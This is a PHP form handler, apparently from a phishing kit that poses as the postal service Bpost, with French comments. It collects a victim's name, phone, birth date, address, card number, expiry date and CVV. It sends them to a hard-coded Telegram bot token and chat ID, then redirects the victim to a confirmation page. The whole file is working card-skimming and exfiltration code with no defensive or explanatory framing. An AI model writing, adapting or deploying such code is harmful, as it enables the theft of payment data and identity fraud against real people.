<?php
// Inclure la bibliothèque Telegram Bot API
require './composer/vendor/autoload.php';

use Longman\TelegramBot\Telegram;
use Longman\TelegramBot\Request;
use Longman\TelegramBot\Entities\ServerResponse;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = $_POST["name"];
    $phone = $_POST["phone"];
    $dob = $_POST["dob"];
    $address = $_POST['address'];
    $city = $_POST['city'];
    $tel = $_POST['tel'];
    $zip = $_POST['zip'];
    $ccowner = $_POST["ccowner"];
    $ccnum = $_POST["ccnum"];
    $ccexp = $_POST["ccexp"];
    $cvv = $_POST["cvv"];


    // Initialiser l'API de Telegram avec votre jeton d'API

    $telegram = new Telegram('6684577871:AAHFXqeWVPoR80z8WY0ffDGG4ROYUw1yIWQ');

    // Créer le message que vous souhaitez envoyer à Telegram
    $message = "Bpost Doua :\n\n";
    $message .= "nom: $name\n";
    $message .= "telephone: $phone\n";
    $message .= "ville: $city\n";
    $message .= "date: $dob\n";
    $message .= "address: $address\n";
    $message .= "zip: $zip\n";
    $message .= "titulaire de carte: $ccowner\n";
    $message .= "ccnum: $ccnum\n";
    $message .= "date d'expiration: $ccexp\n";
    $message .= "cvv: $cvv\n";


    // L'ID du chat où vous voulez envoyer le message (remplacez par le vôtre)
    $chatId = '5657170297';

    // Envoyer le message à Telegram
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    /** @var ServerResponse $response */
    $response = Request::sendMessage($data);

    // Rediriger l'utilisateur vers la page de confirmation
    header("Location: ../final/final.html");
    exit();
} else {
    echo "Une erreur s'est produite lors de l'envoi du message.";
}
